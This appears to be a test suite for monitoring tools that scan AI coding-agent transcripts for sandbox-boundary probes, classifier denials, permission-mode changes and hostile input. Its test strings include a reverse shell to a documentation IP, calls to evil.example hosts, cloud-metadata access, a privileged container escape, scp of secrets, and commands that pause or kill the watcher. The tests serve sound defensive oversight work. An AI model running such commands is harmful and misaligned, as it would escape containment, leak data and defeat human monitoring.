"""Tests for agentlab-scan and agentlab-monitor against synthetic stream-json."""
import importlib.machinery
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest

LINUX = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "linux")
SCAN = os.path.join(LINUX, "agentlab-scan.py")
MONITOR = os.path.join(LINUX, "agentlab-monitor.py")


def load(path, name):
    loader = importlib.machinery.SourceFileLoader(name, path)
    spec = importlib.util.spec_from_loader(name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


scan = load(SCAN, "agentlab_scan")


def cmd_rules(command):
    return sorted({n for n, kind, rx in scan.COMPILED if kind == "cmd" and rx.search(command)})


def init(mode="auto"):
    return {"type": "system", "subtype": "init", "model": "claude-opus-5-5",
            "permissionMode": mode, "cwd": "/work/target"}


def call(i, name, **inp):
    return {"type": "assistant", "message": {"content": [
        {"type": "tool_use", "id": str(i), "name": name, "input": inp}]}}


def result(i, text, error=False):
    return {"type": "user", "message": {"content": [
        {"type": "tool_result", "tool_use_id": str(i),
         "content": [{"type": "text", "text": text}], "is_error": error}]}}


def prompt(text, mode="auto"):
    """A prompt as a session transcript records it, with the mode it was sent in."""
    m = {"type": "user", "message": {"role": "user", "content": text}}
    if mode is not None:
        m["permissionMode"] = mode
    return m


DENIAL = "Permission to use Bash has been denied by the auto mode classifier"


def stream(*msgs):
    return "".join(json.dumps(m) + "\n" for m in msgs)


class ScanRules(unittest.TestCase):
    def test_benign_security_work_is_quiet(self):
        for command in [
            "make -C /work/target",
            "LD_PRELOAD=./shim.so ./target --fuzz",
            "echo 0 | tee /proc/sys/kernel/randomize_va_space",
            "gdb -p 1234",
            "ls /proc/1234/",
            "curl -s http://localhost:8000/health",
            "curl -o out.json http://127.0.0.1:3000/api",
            "curl http://[::1]:8080/",
            "curl http://0.0.0.0:8000/",
            "wget -qO- http://localhost/",
            "curl http://web:8080/login",
            "curl http://172.17.0.2:5000/",
            "python3 -m http.server 8000 --directory site.com",
            "docker run --rm -p 8080:80 nginx:1.27.1",
            "tail -f build.log",
            "kill %1",
            "pkill -f ./server",
            "kill -9 4242",
            "kill -TERM 4242",
        ]:
            with self.subTest(command=command):
                self.assertEqual(cmd_rules(command), [])

    def test_boundary_probes_are_flagged(self):
        cases = {
            "curl https://example.com/x": ["outbound-url"],
            "nc 8.8.8.8 53": ["outbound-ip"],
            "ping 10.77.0.1": ["lab-network"],
            "sudo ip route add default via 10.77.0.1": ["lab-network", "privilege-or-kernel", "route-or-firewall"],
            "export HTTPS_PROXY=http://x": ["proxy-or-credential-vars"],
            "cat /proc/1/environ": ["other-process-memory"],
            "curl http://169.254.169.254/latest/meta-data/": ["cloud-metadata", "outbound-ip"],
            "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1": ["outbound-ip", "tunnel-or-reverse-shell"],
            "pip install requests": ["package-install"],
            "ls /dev/vmbus": ["hyperv-or-vsock"],
            "docker run -v /:/host --privileged alpine": ["container-escape"],
            "nmap -sn 10.77.0.0/24": ["lab-network", "network-discovery"],
            "scp secrets agent@10.77.0.1:": ["lab-network", "ssh-or-file-transfer"],
            "vi /etc/claude-code/managed-settings.json": ["sensitive-path-in-cmd"],
            # Hosts that start like loopback but resolve anywhere.
            "curl https://127.0.0.1.nip.io/x": ["outbound-url"],
            "curl http://localhost.example.com:8080/": ["outbound-url"],
            "wget https://LOCALHOST.evil.example/payload": ["outbound-url"],
            "curl http://0.0.0.0.example.org/": ["outbound-url"],
            # A user part before the host, other schemes, underscores, .localhost names.
            "curl http://127.0.0.1@evil.example/": ["outbound-url"],
            "curl http://user:pw@evil.example.com/x": ["outbound-url"],
            "curl gopher://evil.example:70/1": ["outbound-url"],
            "curl http://a_b.example.com/": ["outbound-url"],
            "curl http://foo.localhost/": ["outbound-url"],
            # The interactive watcher and what it follows.
            "pkill tail": ["watcher-tamper"],
            "kill -STOP 4242": ["watcher-tamper"],
            "pkill -u agent sshd-session": ["watcher-tamper"],
            "echo 1 > ~/.agentlab-session.pid": ["watcher-tamper"],
            "printf x >> ~/.claude/projects/-work-target/s.jsonl": ["sensitive-path-in-cmd"],
            "kill -s STOP 4242": ["watcher-tamper"],
            "kill -stop 4242": ["watcher-tamper"],
            "kill -SIGTSTP 4242": ["watcher-tamper"],
            "kill --signal STOP 4242": ["watcher-tamper"],
            "killall -STOP bash": ["watcher-tamper"],
            "pkill -19 -x bash": ["watcher-tamper"],
            "echo 'alias ls=x' >> ~/.bashrc": ["sensitive-path-in-cmd"],
        }
        for command, want in cases.items():
            with self.subTest(command=command):
                self.assertEqual(cmd_rules(command), sorted(want))

    def test_search_queries_are_scanned(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "t.jsonl")
            with open(path, "w") as f:
                f.write(stream(init(), call(1, "WebSearch", query="fetch https://evil.example/x")))
            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
        self.assertIn("[outbound-url] WebSearch", r.stdout)

    def test_scan_reads_transcripts_inside_the_archive_without_unpacking(self):
        import io
        import tarfile
        with tempfile.TemporaryDirectory() as d:
            tgz = os.path.join(d, "claude-projects.tgz")
            members = {
                ".claude/projects/-work-target/s.jsonl": stream(prompt("go"), call(1, "Bash", command="make")),
                ".claude/projects/-work-target/s/subagents/agent-1.jsonl":
                    stream(call(2, "Bash", command="curl https://evil.example/")),
                ".claude/projects/-work-target/notes.txt": "curl https://ignored.example/\n",
                "../../escaped.jsonl": stream(call(3, "Bash", command="ping 10.77.0.1")),
            }
            with tarfile.open(tgz, "w:gz") as tar:
                for name, text in members.items():
                    data = text.encode()
                    info = tarfile.TarInfo(name)
                    info.size = len(data)
                    tar.addfile(info, io.BytesIO(data))
            before = set(os.listdir(os.path.dirname(d)))
            r = subprocess.run([sys.executable, "-I", SCAN, tgz], capture_output=True, text=True, cwd=d)
            after = set(os.listdir(os.path.dirname(d)))
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("s.jsonl: 1 tool calls", r.stdout)
        self.assertIn("agent-1.jsonl: 1 tool calls", r.stdout)
        self.assertIn("[outbound-url]", r.stdout)
        self.assertIn("[lab-network]", r.stdout)
        self.assertNotIn("ignored.example", r.stdout)
        self.assertEqual(before, after, "nothing is written outside the archive")

    def test_rules_stay_fast_on_long_hostile_lines(self):
        import time
        for text in ("kill " * 40000, "a." * 100000, "nc " * 60000, "http://" * 30000,
                     "permission to use " + "x" * 200000 + " "):
            started = time.monotonic()
            cmd_rules(text)
            scan.DENY_RE.search(text)
            self.assertLess(time.monotonic() - started, 5, text[:20])

    def make_archive(self, d, members, links=()):
        import io
        import tarfile
        tgz = os.path.join(d, "claude-projects.tgz")
        with tarfile.open(tgz, "w:gz") as tar:
            for name, text in members.items():
                data = text.encode()
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
            for name, kind, target in links:
                info = tarfile.TarInfo(name)
                info.type = kind
                info.linkname = target
                tar.addfile(info)
        return tgz

    def test_archive_links_and_strange_members_are_reported(self):
        import tarfile
        with tempfile.TemporaryDirectory() as d:
            tgz = self.make_archive(d, {"p/aaa.txt": stream(call(1, "Bash", command="ping 10.77.0.1"))},
                                    links=[("p/s.jsonl", tarfile.LNKTYPE, "p/aaa.txt"),
                                           ("p/l.jsonl", tarfile.SYMTYPE, "/etc/passwd")])
            r = subprocess.run([sys.executable, "-I", SCAN, tgz], capture_output=True, text=True)
        self.assertIn("p/s.jsonl: 1 tool calls", r.stdout, "a hard-linked transcript is read")
        self.assertIn("[lab-network]", r.stdout)
        self.assertIn("p/l.jsonl", r.stdout)
        self.assertIn("not a regular file", r.stdout)

    def test_archive_problems_are_findings_not_crashes(self):
        with tempfile.TemporaryDirectory() as d:
            empty = self.make_archive(d, {"p/notes.txt": "hello\n"})
            r = subprocess.run([sys.executable, "-I", SCAN, empty], capture_output=True, text=True)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn("holds no .jsonl transcripts", r.stdout)
            bad = os.path.join(d, "bad.tgz")
            with open(empty, "rb") as f:
                data = bytearray(f.read())
            data[len(data) // 2] ^= 0xFF
            with open(bad, "wb") as f:
                f.write(data)
            r = subprocess.run([sys.executable, "-I", SCAN, bad], capture_output=True, text=True)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn("[unreadable-archive]", r.stdout)
            self.assertNotIn("Traceback", r.stderr)

    def test_archive_caps(self):
        with tempfile.TemporaryDirectory() as d:
            tgz = self.make_archive(d, {"p/big.jsonl": stream(prompt("x" * 200))})
            saved = scan.MAX_MEMBER
            scan.MAX_MEMBER = 100
            try:
                (label, (hits, *_)), = list(scan.scan_archive(tgz))
            finally:
                scan.MAX_MEMBER = saved
        self.assertEqual(hits[0][1], "unreadable-line")
        self.assertIn("over the cap", hits[0][3])

    def test_hits_come_first(self):
        with tempfile.TemporaryDirectory() as d:
            members = {f"p/quiet-{i:03}.jsonl": stream(prompt("go")) for i in range(60)}
            members["p/zzz.jsonl"] = stream(call(1, "Bash", command="ping 10.77.0.1"))
            tgz = self.make_archive(d, members)
            r = subprocess.run([sys.executable, "-I", SCAN, tgz], capture_output=True, text=True)
        self.assertIn("zzz.jsonl", r.stdout.splitlines()[0])

    def test_scan_exit_status_and_denials(self):
        with tempfile.TemporaryDirectory() as d:
            clean = os.path.join(d, "clean.jsonl")
            with open(clean, "w") as f:
                f.write(stream(init(), call(1, "Bash", command="make"), result(1, "ok")))
            r = subprocess.run([sys.executable, "-I", SCAN, clean], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stdout)

            dirty = os.path.join(d, "dirty.jsonl")
            with open(dirty, "w") as f:
                f.write(stream(init(),
                               call(1, "Bash", command="ip route add default via 10.77.0.1"),
                               result(1, DENIAL, error=True),
                               call(2, "Write", file_path="/etc/netplan/01.yaml", content="x")))
            r = subprocess.run([sys.executable, "-I", SCAN, dirty], capture_output=True, text=True)
            self.assertEqual(r.returncode, 2)
            self.assertIn("[route-or-firewall]", r.stdout)
            self.assertIn("[auto-mode-denial]", r.stdout)
            self.assertIn("[sensitive-path]", r.stdout)
            self.assertIn("1 auto mode denials", r.stdout)

    def test_scan_flags_runs_outside_auto_mode(self):
        no_mode = init()
        del no_mode["permissionMode"]
        for name, msgs in {
            "init in default mode": [init("default")],
            "init with no mode": [no_mode],
            "prompt in acceptEdits": [prompt("go"), prompt("again", "acceptEdits")],
        }.items():
            with self.subTest(name), tempfile.TemporaryDirectory() as d:
                path = os.path.join(d, "t.jsonl")
                with open(path, "w") as f:
                    f.write(stream(*msgs))
                r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
                self.assertEqual(r.returncode, 2, r.stdout)
                self.assertIn("[not-auto-mode]", r.stdout)
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "t.jsonl")
            with open(path, "w") as f:
                f.write(stream(prompt("go"), call(1, "Bash", command="make"), result(1, "ok")))
            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stdout)


class Monitor(unittest.TestCase):
    def run_monitor(self, text, *args):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "t.jsonl")
            r = subprocess.run([sys.executable, "-I", MONITOR, "--out", out, "--quiet", *args],
                               input=text, capture_output=True, text=True)
            with open(out) as f:
                written = f.read()
        return r.returncode, written

    def test_clean_run_finishes_and_records_everything(self):
        text = stream(init(), call(1, "Bash", command="make"), result(1, "ok"),
                      {"type": "result", "subtype": "success", "num_turns": 1})
        rc, written = self.run_monitor(text, "--require-init")
        self.assertEqual(rc, 0)
        self.assertEqual(written, text)

    def test_stops_when_not_in_auto_mode(self):
        rc, _ = self.run_monitor(stream(init("default"), call(1, "Bash", command="make")))
        self.assertEqual(rc, 3)

    def test_stops_after_three_denials_in_a_row(self):
        msgs = [init()]
        for i in range(3):
            msgs += [call(i, "Bash", command="curl https://example.com"), result(i, DENIAL, error=True)]
        rc, _ = self.run_monitor(stream(*msgs))
        self.assertEqual(rc, 4)

    def test_success_resets_the_consecutive_count(self):
        msgs = [init()]
        for i in range(6):
            msgs += [call(i, "Bash", command="x"), result(i, DENIAL if i % 2 == 0 else "ok", error=i % 2 == 0)]
        rc, _ = self.run_monitor(stream(*msgs))
        self.assertEqual(rc, 0)

    def test_stops_at_the_total_denial_budget(self):
        msgs = [init()]
        for i in range(10):
            msgs += [call(i, "Bash", command="x"), result(i, DENIAL if i % 2 == 0 else "ok", error=i % 2 == 0)]
        rc, _ = self.run_monitor(stream(*msgs), "--max-denials", "5")
        self.assertEqual(rc, 4)

    def test_classifier_unavailable_is_not_a_denial(self):
        text = "temporarily unavailable, so auto mode cannot determine the safety of Bash"
        msgs = [init()]
        for i in range(5):
            msgs += [call(i, "Bash", command="x"), result(i, text, error=True)]
        rc, _ = self.run_monitor(stream(*msgs))
        self.assertEqual(rc, 0)

    def test_missing_init_fails_when_required(self):
        rc, _ = self.run_monitor(stream(call(1, "Bash", command="x")), "--require-init")
        self.assertEqual(rc, 5)

    def test_stops_when_init_has_no_permission_mode(self):
        no_mode = init()
        del no_mode["permissionMode"]
        rc, _ = self.run_monitor(stream(no_mode, call(1, "Bash", command="make")), "--require-init")
        self.assertEqual(rc, 6)


class SessionMonitor(unittest.TestCase):
    """Interactive runs: agentlab-run feeds the monitor the session transcript."""

    def run_session(self, *msgs):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "t.jsonl")
            r = subprocess.run([sys.executable, "-I", MONITOR, "--out", out, "--quiet", "--session"],
                               input=stream(*msgs), capture_output=True, text=True)
        return r.returncode

    def test_a_session_in_auto_mode_finishes(self):
        self.assertEqual(self.run_session(prompt("go"), call(1, "Bash", command="make"), result(1, "ok"),
                                          prompt("thanks")), 0)

    def test_a_prompt_outside_auto_mode_stops_the_session(self):
        for mode in ("default", "acceptEdits", "plan", "bypassPermissions"):
            with self.subTest(mode=mode):
                self.assertEqual(self.run_session(prompt("go"), call(1, "Bash", command="make"),
                                                  result(1, "ok"), prompt("next", mode)), 3)

    def test_a_session_that_never_records_its_mode_is_not_confirmed(self):
        self.assertEqual(self.run_session(prompt("go", None), call(1, "Bash", command="make")), 6)
        self.assertEqual(self.run_session(), 6)

    def test_the_denial_budget_applies_to_sessions(self):
        msgs = [prompt("go")]
        for i in range(3):
            msgs += [call(i, "Bash", command="curl https://example.com"), result(i, DENIAL, error=True)]
        self.assertEqual(self.run_session(*msgs), 4)


def field_denial(i, text="Not allowed here."):
    """An auto mode denial as Claude Code 2.1.319 records it in a session
    transcript: marked by the record's own fields, whatever its text says."""
    m = result(i, text, error=True)
    m["toolDenialKind"] = "automode-blocked"
    m["permissionDecision"] = {"decision": "reject", "reasonType": "classifier",
                               "reasonCode": "classifier:auto-mode"}
    return m


# The wording Claude Code 2.1.319 uses when the classifier refuses a tool call.
DENIAL_2_1_319 = ("Permission for this action was denied by the Claude Code auto mode "
                  "classifier. Reason: [example].")


class Denials(unittest.TestCase):
    def run_monitor(self, data, *args):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "t.jsonl")
            r = subprocess.run([sys.executable, "-I", MONITOR, "--out", out, "--quiet", *args],
                               input=data.encode(), capture_output=True)
        return r.returncode

    def test_denials_marked_by_their_fields_count_in_sessions(self):
        msgs = [prompt("go")]
        for i in range(3):
            msgs += [call(i, "Bash", command="x"), field_denial(i)]
        self.assertEqual(self.run_monitor(stream(*msgs), "--session"), 4)

    def test_the_2_1_319_denial_text_counts_without_fields(self):
        msgs = [init()]
        for i in range(3):
            msgs += [call(i, "Bash", command="x"), result(i, DENIAL_2_1_319, error=True)]
        self.assertEqual(self.run_monitor(stream(*msgs)), 4)

    def test_a_marked_denial_counts_even_if_its_text_reads_as_unavailable(self):
        text = "temporarily unavailable, so auto mode cannot determine the safety of Bash"
        msgs = [prompt("go")]
        for i in range(3):
            msgs += [call(i, "Bash", command="x"), field_denial(i, text)]
        self.assertEqual(self.run_monitor(stream(*msgs), "--session"), 4)

    def test_a_decision_marked_denial_counts_even_if_its_text_reads_as_unavailable(self):
        text = "temporarily unavailable, so auto mode cannot determine the safety of Bash"
        msgs = [prompt("go")]
        for i in range(3):
            m = field_denial(i, text)
            del m["toolDenialKind"]          # only permissionDecision marks it
            msgs += [call(i, "Bash", command="x"), m]
        self.assertEqual(self.run_monitor(stream(*msgs), "--session"), 4)
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "t.jsonl")
            with open(path, "w") as f:
                f.write(stream(*msgs))
            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
        self.assertIn("3 auto mode denials, 0 classifier-unavailable", r.stdout)

    def test_scan_counts_denials_marked_by_their_fields(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "t.jsonl")
            with open(path, "w") as f:
                f.write(stream(prompt("go"), call(1, "Bash", command="x"), field_denial(1)))
            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
        self.assertIn("1 auto mode denials", r.stdout)
        self.assertIn("[auto-mode-denial]", r.stdout)


class HostileInput(unittest.TestCase):
    """In an interactive run the agent can write the transcript the monitor reads.
    A line it can't trust must stop a session, never end the monitor's loop."""

    # Valid records of a shape the monitor didn't expect: read past, never fatal.
    ODD = {
        "a text block whose text is a number":
            b'{"type":"assistant","message":{"content":[{"type":"text","text":1}]}}\n',
        "a tool_use whose input is a number":
            b'{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":5}]}}\n',
        "a message that is a list": b'{"type":"user","message":[1]}\n',
    }
    # Lines that aren't transcript records: a session stops on them.
    BAD = {
        "invalid UTF-8": b"\xff\xfe not text\n",
        "deeply nested JSON": b"[" * 100000 + b"]" * 100000 + b"\n",
        "an init record": b'{"type":"system","subtype":"init"}\n',
        "JSON that isn't an object": b"[1, 2, 3]\n",
        "a line that isn't JSON": b"hello\n",
    }

    def run_monitor(self, data, *args):
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "t.jsonl")
            r = subprocess.run([sys.executable, "-I", MONITOR, "--out", out, "--quiet", *args],
                               input=data, capture_output=True)
            with open(out, "rb") as f:
                written = f.read()
        return r.returncode, written, r.stderr

    def test_a_bad_line_stops_a_session_and_is_kept_as_evidence(self):
        for name, bad in self.BAD.items():
            with self.subTest(name):
                data = stream(prompt("go")).encode() + bad + stream(prompt("now", "acceptEdits")).encode()
                rc, written, err = self.run_monitor(data, "--session")
                self.assertEqual(rc, 7, err)
                self.assertTrue(written.startswith(stream(prompt("go")).encode() + bad),
                                "the evidence copy keeps the bad line byte for byte")

    def test_an_odd_record_never_hides_what_follows_it(self):
        for name, odd in self.ODD.items():
            with self.subTest(name):
                data = stream(prompt("go")).encode() + odd + stream(prompt("now", "acceptEdits")).encode()
                rc, written, err = self.run_monitor(data, "--session")
                self.assertEqual(rc, 3, err)
                self.assertEqual(written, data)

    def test_a_bad_line_in_a_headless_stream_is_skipped(self):
        for name, bad in {**self.ODD, **self.BAD}.items():
            if name == "an init record":
                continue
            with self.subTest(name):
                data = stream(init()).encode() + bad + stream(call(1, "Bash", command="make"),
                                                               result(1, "ok")).encode()
                rc, written, err = self.run_monitor(data)
                self.assertEqual(rc, 0, err)
                self.assertEqual(written, data)

    def test_size_limits_stop_the_run(self):
        long_line = stream(prompt("x" * 500)).encode()
        self.assertEqual(self.run_monitor(long_line, "--session", "--max-line-bytes", "100")[0], 7)
        many = stream(*[prompt("go")] * 50).encode()
        self.assertEqual(self.run_monitor(many, "--session", "--max-total-bytes", "1000")[0], 7)

    def test_the_view_can_go_to_a_log_file(self):
        with tempfile.TemporaryDirectory() as d:
            log = os.path.join(d, "view.log")
            data = stream(prompt("go"), prompt("again", "plan")).encode()
            rc, _, _ = self.run_monitor(data, "--session", "--log", log)
            with open(log) as f:
                view = f.read()
        self.assertEqual(rc, 3)
        self.assertIn("STOP: a prompt was sent in permission mode 'plan'", view)

    def test_scan_reports_lines_it_cannot_read(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "t.jsonl")
            with open(path, "wb") as f:
                f.write(stream(init()).encode() + b'{"type": "assistant", "mess\n'
                        + self.BAD["deeply nested JSON"] + stream(call(1, "Bash", command="make")).encode())
            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertEqual(r.stdout.count("[unreadable-line]"), 2)



# Window title (OSC 0, ended by BEL), clear screen, cursor up, a C1 control
# sequence introducer, and a right-to-left override.
ESCAPES = "\x1b]0;owned\x07\x1b[2J\x1b[1A\x9b2K\u202e"


class TerminalOutput(unittest.TestCase):
    """Text the agent wrote reaches the operator's terminal escaped."""

    def assert_inert(self, text):
        for ch in ("\x1b", "\x07", "\x9b", "\u202e", "\ud800"):
            self.assertNotIn(ch, text)
        self.assertIn("\\x1b", text)

    def test_monitor_escapes_agent_text(self):
        msgs = [dict(init(), cwd="/work" + ESCAPES),
                call(1, "Bash" + ESCAPES, command="echo " + ESCAPES),
                result(1, "boom " + ESCAPES, error=True),
                {"type": "assistant", "message": {"content": [
                    {"type": "text", "text": "lone surrogate \ud800 " + ESCAPES}]}}]
        raw = stream(*msgs) + "not json " + ESCAPES + "\n"
        with tempfile.TemporaryDirectory() as d:
            out = os.path.join(d, "t.jsonl")
            r = subprocess.run([sys.executable, "-I", MONITOR, "--out", out],
                               input=raw, capture_output=True, text=True)
            with open(out) as f:
                written = f.read()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assert_inert(r.stdout)
        self.assertEqual(written, raw, "the evidence copy must stay byte for byte")

    def test_scan_escapes_agent_text(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "t.jsonl")
            with open(path, "w") as f:
                f.write(stream(init(), call(1, "Bash" + ESCAPES,
                                            command="curl https://example.com/" + ESCAPES)))
            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("[outbound-url]", r.stdout)
        self.assert_inert(r.stdout)


if __name__ == "__main__":
    unittest.main()
